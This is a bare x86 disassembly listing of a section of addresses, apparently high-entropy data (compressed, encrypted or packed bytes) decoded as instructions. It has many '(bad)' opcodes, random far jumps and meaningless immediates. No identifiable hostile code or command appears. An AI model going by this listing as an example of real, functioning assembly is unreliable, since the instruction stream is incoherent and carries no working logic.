  40ca8d:	ds ins DWORD PTR es:[di],dx
  40ca90:	(bad)  
  40ca91:	es aaa 
  40ca93:	data16 fbstp TBYTE PTR [edx]
  40ca96:	sub    BYTE PTR [ecx],bh
  40ca98:	sub    DWORD PTR [eax],eax
  40ca9a:	bound  esp,QWORD PTR [eax]
  40ca9c:	pop    eax
  40ca9d:	std    
  40ca9e:	dec    ecx
  40ca9f:	and    DWORD PTR [eax+0x7b],edi
  40caa2:	pop    esp
  40caa3:	jmp    0x7c6a:0xab21433a
  40caaa:	or     bl,BYTE PTR [esi+0x7d0c9ff7]
  40cab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cab1:	cmp    al,0x21
  40cab3:	xor    DWORD PTR [esi],ecx
  40cab5:	mov    dl,0x48
  40cab7:	inc    bx
  40cab9:	loopne 0x40ca81
  40cabb:	mov    DWORD PTR [edx],edi
  40cabd:	dec    edi
  40cabe:	jo     0x40caa4
  40cac0:	hlt    
  40cac1:	sahf   
  40cac2:	popf   
  40cac3:	rcl    DWORD PTR [eax+0x3a90c217],cl
  40cac9:	retf   0xf2a1
  40cacc:	fxch   st(5)
  40cace:	(bad)  
  40cacf:	xchg   ebp,eax
  40cad0:	aas    
  40cad1:	jecxz  0x40cb0b
  40cad3:	imul   esp,esp,0xbe203af5
  40cad9:	das    
  40cada:	or     BYTE PTR ds:0x62e60f63,bl
  40cae0:	ins    BYTE PTR es:[edi],dx
  40cae1:	loopne 0x40cb04
  40cae3:	push   edi
  40cae4:	dec    ebp
  40cae5:	push   0x5c
  40cae7:	shl    BYTE PTR [eax],cl
  40cae9:	gs jb  0x40cb11
  40caec:	push   ebp
  40caed:	(bad)  
  40caef:	and    esp,DWORD PTR [ebx]
  40caf1:	or     al,0xe2
  40caf3:	ja     0x40cadd
  40caf5:	popf   
  40caf6:	fsub   QWORD PTR [edx]
  40caf8:	dec    ecx
  40caf9:	pop    eax
  40cafa:	sub    ah,ah
  40cafc:	ja     0x40cac8
  40cafe:	push   ecx
  40caff:	enter  0xd11a,0xc4
  40cb03:	mov    al,ds:0xf8be0800
  40cb08:	fld    QWORD PTR [esi]
  40cb0a:	pop    eax
  40cb0b:	(bad)  
  40cb0c:	adc    ebp,DWORD PTR [eax]
  40cb0e:	adc    eax,0xa24df6d0
  40cb13:	stos   DWORD PTR es:[edi],eax
  40cb14:	mov    ch,BYTE PTR [esi]
  40cb16:	pop    ebx
  40cb17:	push   ebx
  40cb18:	leave  
  40cb19:	sub    ebx,DWORD PTR [ecx]
  40cb1b:	mov    al,ds:0xd3ca29d7
  40cb20:	into   
  40cb21:	test   al,0x94
  40cb23:	inc    edx
  40cb24:	mov    ds:0xc765b691,al
  40cb29:	fimul  DWORD PTR [esi-0x57]
  40cb2c:	jnp    0x40cb39
  40cb2e:	pusha  
  40cb2f:	in     eax,dx
  40cb30:	sahf   
  40cb31:	aad    0x9e
  40cb33:	jmp    0xf0ca:0xc4f3df2c
  40cb3a:	loop   0x40cb61
  40cb3c:	stos   BYTE PTR es:[edi],al
  40cb3d:	or     al,0xd
  40cb3f:	cli    
  40cb40:	addr16 out 0x8b,al
  40cb43:	or     BYTE PTR [eax],cl
  40cb45:	popa   
  40cb46:	mov    bl,0x11
  40cb48:	bound  ebx,QWORD PTR [ecx-0x50]
  40cb4b:	cdq    
  40cb4c:	cwde   
  40cb4d:	or     bl,cl
  40cb4f:	push   ebp
  40cb50:	jns    0x40cb27
  40cb52:	pop    ecx
  40cb53:	jo     0x40cbc6
  40cb55:	fwait
  40cb56:	push   ebx
  40cb57:	dec    edi
  40cb58:	pop    edx
  40cb59:	push   esp
  40cb5a:	sbb    dh,BYTE PTR [esi]
  40cb5c:	fist   DWORD PTR [eax]
  40cb5e:	popf   
  40cb5f:	mov    ch,0x13
  40cb61:	xor    DWORD PTR [ecx+0x63],ebx
  40cb64:	cli    
  40cb65:	inc    edx
  40cb66:	add    eax,0xce3b5400
  40cb6b:	aas    
  40cb6c:	mov    ds:0x525c463a,eax
  40cb71:	clc    
  40cb72:	ja     0x40cbaf
  40cb74:	push   es
  40cb75:	fstp   TBYTE PTR [ecx-0x7d]
  40cb78:	addr16 data16 and al,0xf3
  40cb7c:	repnz and ch,dl
  40cb7f:	mov    edx,0x7342ca49
  40cb84:	push   ds
  40cb85:	dec    ecx
  40cb86:	test   cl,0xe5
  40cb89:	mov    esp,0xa26a03e5
  40cb8e:	lods   eax,DWORD PTR ds:[esi]
  40cb8f:	jns    0x40cbe2
  40cb91:	in     eax,0x5c
  40cb93:	push   ebx
  40cb94:	inc    BYTE PTR [esi+0x56]
  40cb97:	pop    ds
  40cb98:	push   esp
  40cb99:	cmc    
  40cb9a:	push   ecx
  40cb9b:	fdiv   DWORD PTR [esi+esi*1+0x49]
  40cb9f:	test   BYTE PTR ds:0xe80f35e0,dl
  40cba5:	push   ss
  40cba6:	push   0xffffff89
  40cba8:	pop    eax
  40cba9:	jp     0x40cba9
  40cbab:	popa   
  40cbac:	xchg   ebp,eax
  40cbad:	jo     0x40cb86
  40cbaf:	mov    ah,0x3b
  40cbb1:	js     0x40cba5
  40cbb3:	(bad)  
  40cbb4:	out    dx,eax
  40cbb5:	jmp    0x42953575
  40cbba:	cli    
  40cbbb:	mov    ds:0x8778220f,eax
  40cbc0:	mov    esp,0xf23f834f
  40cbc5:	stos   BYTE PTR es:[edi],al
  40cbc6:	dec    esi
  40cbc7:	shl    DWORD PTR [edi+0x74c90fec],cl
  40cbcd:	pushf  
  40cbce:	xchg   DWORD PTR [ebx-0x76],ebp
  40cbd1:	push   ds
  40cbd2:	pop    eax
  40cbd3:	mov    DWORD PTR [eax+0x57],edi
  40cbd6:	loop   0x40cbf4
  40cbd8:	ds xchg edx,eax
  40cbda:	gs cli 
  40cbdc:	inc    edx
  40cbdd:	jg     0x40cc1a
  40cbdf:	pop    ebp
  40cbe0:	fnstsw WORD PTR [edi]
  40cbe2:	sbb    edx,DWORD PTR [esi-0x72]
  40cbe5:	mov    eax,0xfd924fdd
  40cbea:	scas   eax,DWORD PTR es:[edi]
  40cbeb:	mov    bl,cl
  40cbed:	in     eax,0x6e
  40cbef:	aas    
  40cbf0:	imul   ebp,DWORD PTR [edx+0x50],0xffffffcf
  40cbf4:	add    bh,BYTE PTR [ebx]
  40cbf6:	mov    dl,0x39
  40cbf8:	fiadd  DWORD PTR [edx+0x9]
  40cbfb:	call   0xeb9f4867
  40cc00:	sbb    edi,DWORD PTR [ecx+ecx*8+0x4b]
  40cc04:	cmc    
  40cc05:	shl    DWORD PTR [edx],1
  40cc07:	hlt    
  40cc08:	jmp    0x14f4:0xc2f841a6
  40cc0f:	and    BYTE PTR [edi+eax*2+0xfc6d421],dl
  40cc16:	sbb    BYTE PTR [edx],ch
  40cc18:	into   
  40cc19:	cmp    al,0x9a
  40cc1b:	xlat   BYTE PTR ds:[ebx]
  40cc1c:	pop    esi
  40cc1d:	enter  0x23f9,0xf5
  40cc21:	mov    edx,DWORD PTR [ebx]
  40cc23:	stos   BYTE PTR es:[edi],al
  40cc24:	mov    BYTE PTR [ebp-0x79],al
  40cc27:	mov    edx,DWORD PTR [ebx-0x5]
  40cc2a:	cmp    eax,0xa7fb7432
  40cc2f:	inc    BYTE PTR [edi+ebp*2]
  40cc32:	fwait
  40cc33:	popf   
  40cc34:	int3   
  40cc35:	xchg   esp,eax
  40cc36:	jae    0x40cbfd
  40cc38:	mov    bl,0x88
  40cc3a:	adc    bh,BYTE PTR [esi-0x168733c3]
  40cc40:	ds sub al,0x6f
  40cc43:	mov    eax,0x64562f
  40cc48:	mov    al,ds:0xe8d8de81
  40cc4d:	ins    BYTE PTR es:[edi],dx
  40cc4e:	fsubp  st(2),st
  40cc50:	pop    ebx
  40cc51:	pushf  
  40cc52:	dec    ecx
  40cc53:	lahf   
  40cc54:	loop   0x40cc14
  40cc56:	pop    edx
  40cc57:	jge    0x40cc02
  40cc59:	daa    
  40cc5a:	jg     0x40cca8
  40cc5c:	xor    al,BYTE PTR ds:0x4ab898e9
  40cc62:	(bad)  
  40cc63:	jg     0x40cca3
  40cc65:	bound  esi,QWORD PTR [ecx+0xcd7f133]
  40cc6b:	mov    BYTE PTR [edx],bh
  40cc6d:	in     al,0x62
  40cc6f:	leave  
  40cc70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc71:	lock dec esp
  40cc73:	dec    esi
  40cc74:	sbb    DWORD PTR [ebx],ebx
  40cc76:	sbb    DWORD PTR [edi+edi*8-0x59],0xffffffd3
  40cc7b:	data16 sbb al,ah
  40cc7e:	ins    BYTE PTR es:[edi],dx
  40cc7f:	js     0x40ccb3
  40cc81:	sbb    esi,DWORD PTR [edi-0x7b]
  40cc84:	fiadd  DWORD PTR [edi]
  40cc86:	xchg   esp,eax
  40cc87:	in     eax,0xd0
  40cc89:	or     eax,0x88133ae9
  40cc8e:	call   0x6d6e:0x61912023
  40cc95:	sub    DWORD PTR [ebx-0x29],0x5c
  40cc99:	aas    
  40cc9a:	clc    
  40cc9b:	clc    
  40cc9c:	and    edx,DWORD PTR [ebp+0x40deecd0]
  40cca2:	scas   al,BYTE PTR es:[edi]
  40cca3:	or     BYTE PTR [edi+0x20],ah
  40cca6:	sbb    DWORD PTR [ebx],0x36a3f379
  40ccac:	gs mov cl,0x8d
  40ccaf:	pushf  
  40ccb0:	xor    ebx,ecx
  40ccb2:	and    DWORD PTR [eax+0x79],esp
  40ccb5:	mov    eax,ds:0xda7c2f3e
  40ccba:	scas   eax,DWORD PTR es:[edi]
  40ccbb:	sbb    DWORD PTR [edx],ecx
  40ccbd:	xor    al,0x59
  40ccbf:	int3   
  40ccc0:	mov    eax,ds:0x18e8fe4b
  40ccc5:	mov    esp,0xb9abed13
  40ccca:	mov    al,ds:0x3f74851f
  40cccf:	or     al,0xdc
  40ccd1:	mov    al,0xad
  40ccd3:	bound  esp,QWORD PTR [ebx-0x71a546dc]
  40ccd9:	mov    BYTE PTR [ecx-0x19],ch
  40ccdc:	iret   
  40ccdd:	outs   dx,DWORD PTR ds:[esi]
  40ccde:	in     eax,0xa1
  40cce0:	not    DWORD PTR [edi+esi*8+0x528e3969]
  40cce7:	mov    esi,DWORD PTR [ebp+ebp*8-0x6fdc2abd]
  40ccee:	int    0x28
  40ccf0:	adc    eax,0x2a41968d
  40ccf5:	mov    ds:0x1b072fb,eax
  40ccfa:	jbe    0x40cd29
  40ccfc:	pop    ecx
  40ccfd:	inc    esp
  40ccfe:	out    0x68,eax
  40cd00:	push   ebp
  40cd01:	je     0x40ccd2
  40cd03:	loop   0x40cc88
  40cd05:	xchg   ebp,eax
  40cd06:	minps  xmm6,XMMWORD PTR [esi+ebx*8+0xf79d43a]
  40cd0e:	shl    BYTE PTR [ebx],1
  40cd10:	call   0x3a49:0xc6e84ea
  40cd17:	xchg   edx,eax
  40cd18:	xchg   esp,eax
  40cd19:	leave  
  40cd1a:	pop    esi
  40cd1b:	arpl   bx,bx
  40cd1d:	add    al,0x88
  40cd1f:	dec    ebx
  40cd20:	mov    esp,0xa6844f73
  40cd25:	test   ebp,0xb5f0653b
  40cd2b:	push   ds
  40cd2c:	mov    esp,0x1e6f8e3c
  40cd31:	adc    DWORD PTR [ecx+0x46],esp
  40cd34:	xchg   esi,eax
  40cd35:	jne    0x40cce1
  40cd37:	test   BYTE PTR fs:[esi+0xd],ch
  40cd3b:	or     al,0xf3
  40cd3d:	jl     0x40cd2e
  40cd3f:	into   
  40cd40:	neg    DWORD PTR [eax]
  40cd42:	sbb    ebx,DWORD PTR [esi+0x79]
  40cd45:	shl    BYTE PTR [ebp-0x32],cl
  40cd48:	ins    DWORD PTR es:[edi],dx
  40cd49:	and    eax,0xd29df89d
  40cd4e:	sahf   
  40cd4f:	push   edi
  40cd50:	xchg   esi,eax
  40cd51:	stc    
  40cd52:	loopne 0x40ccdd
  40cd54:	cld    
  40cd55:	mov    DWORD PTR [edi-0x7e],edx
  40cd58:	mov    bl,0xc2
  40cd5a:	call   0x6beb:0xa8a5126a
  40cd61:	adc    eax,0xd5777109
  40cd66:	xor    eax,0xb69ce904
  40cd6b:	lods   eax,DWORD PTR ds:[esi]
  40cd6c:	cld    
  40cd6d:	and    dh,BYTE PTR [esi]
  40cd6f:	fnstcw WORD PTR [ecx]
  40cd71:	pop    eax
  40cd72:	fisubr WORD PTR [ebp+0x48]
  40cd75:	jnp    0x40cdbb
  40cd77:	into   
  40cd78:	mov    ecx,0xa4534a1d
  40cd7d:	mov    esi,0x98f65921
  40cd82:	stos   DWORD PTR es:[edi],eax
  40cd83:	imul   BYTE PTR [ebx-0x34]
  40cd86:	add    dl,BYTE PTR [eax]
  40cd88:	xchg   edx,eax
  40cd89:	push   esi
  40cd8a:	jg     0x40cdf6
  40cd8c:	cmp    DWORD PTR [edx+0x51cedb6d],0x25805553
  40cd96:	push   ecx
  40cd97:	mov    ch,0xf7
  40cd99:	fist   WORD PTR [ebx+edi*4+0x341373cb]
  40cda0:	in     eax,0x93
  40cda2:	(bad)  
  40cda3:	xlat   BYTE PTR ds:[ebx]
  40cda4:	sbb    al,0x4b
  40cda6:	aam    0xf0
  40cda8:	xchg   edx,eax
  40cda9:	pop    edi
  40cdaa:	mov    edi,edi
  40cdac:	and    eax,esp
  40cdae:	dec    eax
  40cdaf:	mov    edi,0xec947d84
  40cdb4:	jg     0x40cdd9
  40cdb6:	loopne 0x40cdd5
  40cdb8:	shr    DWORD PTR [ebx-0x460d0fe9],0x8a
  40cdbf:	(bad)  
  40cdc0:	and    dl,BYTE PTR [esi+0x56]
  40cdc3:	fwait
  40cdc4:	cmp    edi,0x76
  40cdc7:	jae    0x40cd91
  40cdc9:	push   edi
  40cdca:	jmp    0x8c01:0x35d8f898
  40cdd1:	mov    eax,0xb6e5abe9
  40cdd6:	sbb    ebx,DWORD PTR [ebx]
  40cdd8:	pushf  
  40cdd9:	pop    esi
  40cdda:	lahf   
  40cddb:	(bad)  
  40cddc:	ins    DWORD PTR es:[edi],dx
  40cddd:	das    
  40cdde:	mov    edx,0x9640c6ef
  40cde3:	in     al,dx
  40cde4:	je     0x40ce43
  40cde6:	fdiv   QWORD PTR ds:0xa9c58f19
  40cdec:	add    eax,0xc6fc3237
  40cdf1:	test   bh,cl
  40cdf3:	dec    ebp
  40cdf4:	mov    ebp,0x3bf56643
  40cdf9:	adc    dl,dh
  40cdfb:	and    edx,DWORD PTR [ebx]
  40cdfd:	mov    ebx,0xe40785d5
  40ce02:	sar    BYTE PTR [eax+0x2f147f98],cl
  40ce08:	imul   ebx,DWORD PTR [eax-0x722cc898],0x2b
  40ce0f:	in     eax,dx
  40ce10:	mov    al,0xe6
  40ce12:	add    BYTE PTR [edi],0x46
  40ce15:	cmp    eax,0x392a8147
  40ce1a:	inc    edx
  40ce1b:	ins    DWORD PTR es:[edi],dx
  40ce1c:	push   cs
  40ce1d:	aam    0x93
  40ce1f:	adc    ch,BYTE PTR [edx+0x40d4c7c4]
  40ce25:	fild   DWORD PTR [eax]
  40ce27:	test   ch,ah
  40ce29:	ss loop 0x40ce07
  40ce2c:	lods   al,BYTE PTR ds:[esi]
  40ce2d:	sti    
  40ce2e:	fiadd  WORD PTR [ebx]
  40ce30:	push   ss
  40ce31:	paddd  mm5,mm3
  40ce34:	push   0x50a5fe3e
  40ce39:	ins    DWORD PTR es:[edi],dx
  40ce3a:	pop    ebp
  40ce3b:	test   BYTE PTR [edi],cl
  40ce3d:	xor    eax,0x58afe147
  40ce42:	fsub   st,st(3)
  40ce44:	retf   
  40ce45:	ds pop ebx
  40ce47:	repnz in eax,0x83
  40ce4a:	xlat   BYTE PTR ds:[ebx]
  40ce4b:	push   es
  40ce4c:	jge    0x40ce6c
  40ce4e:	(bad)  [ebp-0x42e4c858]
  40ce54:	pop    esi
  40ce55:	outs   dx,BYTE PTR ds:[esi]
  40ce56:	iret   
  40ce57:	test   eax,0xce4edd18
  40ce5c:	in     eax,0x99
  40ce5e:	xchg   DWORD PTR [edx-0x1e],esp
  40ce61:	cdq    
  40ce62:	sub    al,BYTE PTR [ebx-0x7c]
  40ce65:	int    0x69
  40ce67:	and    edx,DWORD PTR [edx-0x55]
  40ce6a:	cmp    bh,BYTE PTR [edi+eiz*8+0x27]
  40ce6e:	lock add al,BYTE PTR [bp+si-0xb02]
  40ce74:	scas   eax,DWORD PTR es:[edi]
  40ce75:	mul    esi
  40ce77:	cld    
  40ce78:	push   esi
  40ce79:	iret   
  40ce7a:	loop   0x40cefa
  40ce7c:	and    DWORD PTR [ebx],ebp
  40ce7e:	cld    
  40ce7f:	adc    BYTE PTR [esi],0x4e
  40ce82:	sub    DWORD PTR [edi],esp
  40ce84:	ins    DWORD PTR es:[edi],dx
  40ce85:	ds pop ebx
  40ce87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce88:	rol    edi,1
  40ce8a:	dec    edx
  40ce8b:	into   
  40ce8c:	mov    eax,0x45673931
  40ce91:	adc    eax,0xbdfaeb2d
  40ce96:	es hlt 
  40ce98:	nop
  40ce99:	sub    BYTE PTR [esi-0x1e],al
  40ce9c:	ret    0x65c7
  40ce9f:	shl    ecx,0x71
  40cea2:	pop    ecx
  40cea3:	xor    eax,0x752bfe25
  40cea8:	les    ebp,FWORD PTR ds:0x9b40914d
  40ceae:	and    cl,ah
  40ceb0:	icebp  
  40ceb1:	out    0xf,al
  40ceb3:	cmp    dh,BYTE PTR [ebx+eax*8+0x4e2d5b1d]
  40ceba:	mov    bl,0x20
  40cebc:	scas   al,BYTE PTR es:[edi]
  40cebd:	cdq    
  40cebe:	xchg   ecx,eax
  40cebf:	icebp  
  40cec0:	jle    0x40ce7d
  40cec2:	xor    dl,BYTE PTR [ebx+0x7d]
  40cec5:	mov    bh,0x76
  40cec7:	xchg   ebx,eax
  40cec8:	sbb    al,0xc7
  40ceca:	add    edi,DWORD PTR [ebx]
  40cecc:	and    eax,DWORD PTR [esi+0x7420e1b0]
  40ced2:	jae    0x40ce78
  40ced4:	nop
  40ced5:	dec    ecx
  40ced6:	cmp    ebx,DWORD PTR [esi]
  40ced8:	ss mov esp,0x9df333d0
  40cede:	jbe    0x40cebb
  40cee0:	(bad)  
  40cee1:	hlt    
  40cee2:	ret    0x20ba
  40cee5:	push   es
  40cee6:	cs dec edx
  40cee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cee9:	sahf   
  40ceea:	mov    ds:0xf9f748e8,al
  40ceef:	in     eax,0xf
  40cef1:	fld    TBYTE PTR [esi-0x6a]
  40cef4:	push   edx
  40cef5:	call   0x1daf5053
  40cefa:	or     DWORD PTR [ebx+0xa66fa55],esi
  40cf00:	pop    ecx
  40cf01:	les    esi,FWORD PTR ds:0x78a2fb3
  40cf07:	xor    eax,DWORD PTR [ebx]
  40cf09:	lods   al,BYTE PTR ds:[esi]
  40cf0a:	dec    esi
  40cf0b:	pop    ebp
  40cf0c:	out    dx,al
  40cf0d:	sub    al,0x63
  40cf0f:	ja     0x40cf6b
  40cf11:	std    
  40cf12:	xchg   BYTE PTR [ebx-0x33b12919],dl
  40cf18:	xlat   BYTE PTR ds:[ebx]
  40cf19:	pop    ds
  40cf1a:	das    
  40cf1b:	push   ebx
  40cf1c:	mov    bl,0x67
  40cf1e:	lea    edx,[ebp-0x65]
  40cf21:	and    al,0x8e
  40cf23:	mov    bl,0xeb
  40cf25:	jge    0x40cf14
  40cf27:	aam    0xbd
  40cf29:	push   ebp
  40cf2a:	clc    
  40cf2b:	sahf   
  40cf2c:	jle    0x40cf3a
  40cf2e:	inc    edx
  40cf2f:	nop
  40cf30:	shl    BYTE PTR [esi+ecx*2+0x22],0xde
  40cf35:	jg     0x40cf28
  40cf37:	dec    ebx
  40cf38:	dec    eax
  40cf39:	and    edx,DWORD PTR [eax]
  40cf3b:	mov    edi,0xd7e20fd2
  40cf40:	into   
  40cf41:	fisubr WORD PTR [ecx-0x6ab60d6b]
  40cf47:	enter  0xd562,0x72
  40cf4b:	adc    BYTE PTR [ecx-0x7d31c1f9],0xad
  40cf52:	inc    ecx
  40cf53:	push   ecx
  40cf54:	and    BYTE PTR [edi],0xeb
  40cf57:	dec    ebx
  40cf58:	call   0x6719deb6
  40cf5d:	test   DWORD PTR [ebp-0x3a8021d],esp
  40cf63:	leave  
  40cf64:	or     cl,BYTE PTR [esp+edi*2]
  40cf67:	jecxz  0x40cfd3
  40cf69:	dec    edi
  40cf6a:	dec    edi
  40cf6b:	pop    ss
  40cf6c:	ja     0x40cfcd
  40cf6e:	ror    al,0x58
  40cf71:	pop    edi
  40cf72:	add    DWORD PTR [ebp-0x46],edx
  40cf75:	ins    DWORD PTR es:[edi],dx
  40cf76:	pusha  
  40cf77:	push   esp
  40cf78:	aaa    
  40cf79:	ja     0x40cf00
  40cf7b:	push   ebp
  40cf7c:	int    0x1b
  40cf7e:	mov    dh,0x7d
  40cf80:	loope  0x40cf4b
  40cf82:	fisttp DWORD PTR [ecx]
  40cf84:	mov    ecx,0xde05e317
  40cf89:	dec    edi
  40cf8a:	pop    esi
  40cf8b:	shr    DWORD PTR [edx],0x63
  40cf8e:	or     DWORD PTR [ebx],0xb2e07daf
  40cf94:	rol    ch,0x50
  40cf97:	or     cl,BYTE PTR [eax-0x1a281275]
  40cf9d:	mov    bl,0x9b
  40cf9f:	mov    BYTE PTR [eax],bl
  40cfa1:	ja     0x40cff1
  40cfa3:	rol    esi,cl
  40cfa5:	or     eax,0xdaa5b7a0
  40cfaa:	cmp    eax,0x8ef67896
  40cfaf:	mov    cl,0x72
  40cfb1:	rcr    DWORD PTR gs:[ecx],cl
  40cfb4:	data16 sbb al,0x68
  40cfb7:	and    eax,0x76cd0ecd
  40cfbc:	iret   
  40cfbd:	mov    al,ds:0x3b526d55
  40cfc2:	dec    esp
  40cfc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfc4:	into   
  40cfc5:	daa    
  40cfc6:	inc    esi
  40cfc7:	dec    ecx
  40cfc8:	xlat   BYTE PTR ds:[ebx]
  40cfc9:	ins    BYTE PTR es:[edi],dx
  40cfca:	mov    edi,0xb490d963
  40cfcf:	addr16 cmc 
  40cfd1:	fs sub ecx,ecx
  40cfd4:	adc    edx,edx
  40cfd6:	push   edi
  40cfd7:	xchg   ecx,eax
  40cfd8:	dec    eax
  40cfd9:	adc    al,0xaf
  40cfdb:	(bad)  
  40cfdc:	popf   
  40cfdd:	jg     0x40d007
  40cfdf:	call   0xe362ba53
  40cfe4:	dec    edx
  40cfe5:	sti    
  40cfe6:	fs push eax
  40cfe8:	mov    dh,0x2a
  40cfea:	es pop eax
  40cfec:	ficomp WORD PTR [esi]
  40cfee:	stc    
  40cfef:	clc    
  40cff0:	and    bl,BYTE PTR [edx+0x1bedae80]
  40cff6:	rol    esp,1
  40cff8:	(bad)  
  40cff9:	push   esi
  40cffa:	xchg   DWORD PTR [ebx],ebp
  40cffc:	mov    DWORD PTR [edi],ebp
  40cffe:	repz pop eax
  40d000:	stos   BYTE PTR es:[edi],al
  40d001:	push   cs
  40d002:	div    DWORD PTR [esp+eax*1-0x3]
  40d006:	push   cs
  40d007:	mov    eax,0x7a8314b2
  40d00c:	mov    ebp,0xc118da7
  40d011:	add    BYTE PTR [ebp-0x29],dh
  40d014:	cmp    dl,dl
  40d016:	xchg   BYTE PTR fs:[esi-0x72],cl
  40d01a:	inc    edi
  40d01b:	bnd jl 0x40d04d
  40d01e:	rol    BYTE PTR [edx+0x1f],1
  40d021:	sar    DWORD PTR [ebx+0x77],cl
  40d024:	jbe    0x40cfc9
  40d026:	cmp    bl,BYTE PTR [edx+0x2ea987b9]
  40d02c:	sbb    ebp,DWORD PTR fs:[eax]
  40d02f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d030:	int3   
  40d031:	iret   
  40d032:	jo     0x40cfe6
  40d034:	xor    ah,dh
  40d036:	xor    ah,BYTE PTR [esp+ebp*1]
  40d039:	retf   0x5260
  40d03c:	mov    edi,0x5e730329
  40d041:	je     0x40d088
  40d043:	(bad)  
  40d044:	sub    dh,BYTE PTR [edx-0xbdc492d]
  40d04a:	cmp    eax,0xa4fb6379
  40d04f:	adc    DWORD PTR [ecx+0x3a4022f0],0x71
  40d056:	in     eax,dx
  40d057:	leave  
  40d058:	fisub  WORD PTR [ebx]
  40d05a:	cwde   
  40d05b:	mov    bl,BYTE PTR [eax-0x51bc7d46]
  40d061:	mov    dl,0x5
  40d063:	mov    dh,0x8d
  40d065:	(bad)  
  40d066:	and    edx,DWORD PTR [eax-0x57]
  40d069:	out    dx,eax
  40d06a:	jp     0x40d0ad
  40d06c:	cwde   
  40d06d:	ss sub ah,bl
  40d070:	jmp    0x6c09:0x5a06aa75
  40d077:	push   edx
  40d078:	add    edx,DWORD PTR [esi+ebp*1+0x5f]
  40d07c:	shl    ch,cl
  40d07e:	ds sahf 
  40d080:	int3   
  40d081:	aad    0x88
  40d083:	nop
  40d084:	sbb    bl,BYTE PTR [eax+0x43]
  40d087:	test   DWORD PTR [ecx+0x690c1b86],esi
  40d08d:	push   ss
  40d08e:	cmp    edi,ebp
  40d090:	sub    DWORD PTR [edx+0x2a],edx
  40d093:	stc    
  40d094:	fidivr DWORD PTR [ebp+0x52]
  40d097:	jl     0x40d0aa
  40d099:	mov    bh,0x47
  40d09b:	(bad)  
  40d09c:	imul   eax,DWORD PTR [ecx],0xfffffffa
  40d09f:	inc    ecx
  40d0a0:	pop    esi
  40d0a1:	addr16 pop es
  40d0a3:	and    DWORD PTR [edx+0x24a3058f],esi
  40d0a9:	adc    ecx,edx
  40d0ab:	or     ecx,eax
  40d0ad:	xor    BYTE PTR [edx],bh
  40d0af:	add    al,0x74
  40d0b1:	jne    0x40d091
  40d0b3:	and    eax,edx
  40d0b5:	fld    DWORD PTR [edi+0x78]
  40d0b8:	repnz xchg edi,eax
  40d0ba:	repz retf 0x8696
  40d0be:	enter  0xa340,0x6f
  40d0c2:	and    DWORD PTR [ecx+eiz*1-0x5d5ec8f5],esp
  40d0c9:	ror    DWORD PTR [eax],cl
  40d0cb:	pop    edi
  40d0cc:	cmp    BYTE PTR ds:0xa55e7aa9,0x20
  40d0d3:	fstp   TBYTE PTR [esi+0x34]
  40d0d6:	jno    0x40d064
  40d0d8:	xor    eax,0xc460d4e0
  40d0dd:	fist   DWORD PTR [eax]
  40d0df:	mov    ebx,0x6f604a7d
  40d0e4:	inc    edx
  40d0e5:	repnz inc eax
  40d0e7:	arpl   WORD PTR [esi-0x7b],bx
  40d0ea:	sbb    BYTE PTR [edi-0x4b],bl
  40d0ed:	or     al,0xfb
  40d0ef:	loopne 0x40d13f
  40d0f1:	pop    esi
  40d0f2:	or     al,0x5b
  40d0f4:	sub    eax,0x8e4b521c
  40d0f9:	pop    edi
  40d0fa:	xor    bh,dh
  40d0fc:	mov    dl,0xf6
  40d0fe:	cmp    bl,BYTE PTR [esi+0x7eba412e]
  40d104:	jl     0x40d0a7
  40d106:	sbb    BYTE PTR [eax],0x36
  40d109:	jns    0x40d0dc
  40d10b:	les    edx,FWORD PTR [edx+0x631a92bf]
  40d111:	mov    ah,BYTE PTR [esi+0x78]
  40d114:	mov    dh,0x26
  40d116:	push   cs
  40d117:	cld    
  40d118:	add    bh,BYTE PTR [edx-0x32]
  40d11b:	sub    esi,DWORD PTR [esi+0x70]
  40d11e:	into   
  40d11f:	push   edx
  40d120:	mov    cl,0x96
  40d122:	mul    BYTE PTR [edx-0x61]
  40d125:	mov    edi,0xb38c9bff
  40d12a:	test   eax,0xd49ed3d4
  40d12f:	mov    eax,0xd6b833f7
  40d134:	mov    esp,0xfa04d5f4
  40d139:	ja     0x40d0ed
  40d13b:	cdq    
  40d13c:	mov    edx,0x83e3865b
  40d141:	sub    BYTE PTR [ebp+0x5b718795],dl
  40d147:	jle    0x40d16f
  40d149:	push   ebp
  40d14a:	fidivr DWORD PTR [edi+edx*2]
  40d14d:	fsubr  DWORD PTR ds:0xc1fcdf4a
  40d153:	jle    0x40d111
  40d155:	mov    ebx,0xfc6d1485
  40d15a:	es pusha 
  40d15c:	mov    eax,0x137cc4ac
  40d161:	gs icebp 
  40d163:	jns    0x40d105
  40d165:	retf   
  40d166:	cmp    esi,DWORD PTR ss:[eax]
  40d169:	adc    eax,0x5463d23b
  40d16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d16f:	(bad)  
  40d170:	push   esp
  40d171:	dec    edx
  40d172:	jae    0x40d1ce
  40d174:	jmp    0x8a1c:0x527e791d
  40d17b:	(bad)  
  40d17c:	cli    
  40d17d:	cmp    DWORD PTR [ecx],edi
  40d17f:	outs   dx,DWORD PTR ds:[esi]
  40d180:	call   0x7a4fe4ba
  40d185:	adc    DWORD PTR [esi-0x14],0x4a
  40d189:	test   eax,0x788ea911
  40d18e:	retf   
  40d18f:	adc    dh,cl
  40d191:	jnp    0x40d197
  40d193:	add    al,0xf6
  40d195:	pushf  
  40d196:	aas    
  40d197:	jecxz  0x40d1fd
  40d199:	mov    eax,0xec4bdf45
  40d19e:	mov    dh,0x39
  40d1a0:	in     eax,0xb5
  40d1a2:	call   0xfa2d:0x1762b72c
  40d1a9:	(bad)  
  40d1aa:	ins    BYTE PTR es:[edi],dx
  40d1ab:	fwait
  40d1ac:	(bad)
  40d1af:	int    0x34
  40d1b1:	dec    ebx
  40d1b2:	dec    ebp
  40d1b3:	push   ebx
  40d1b4:	add    eax,0xc924716b
  40d1b9:	lods   eax,DWORD PTR ds:[esi]
  40d1ba:	fs pop ds
  40d1bc:	mov    ah,0xe7
  40d1be:	(bad)  
  40d1bf:	loopne 0x40d144
  40d1c1:	adc    cl,al
  40d1c3:	fnstenv [esi]
  40d1c5:	out    dx,eax
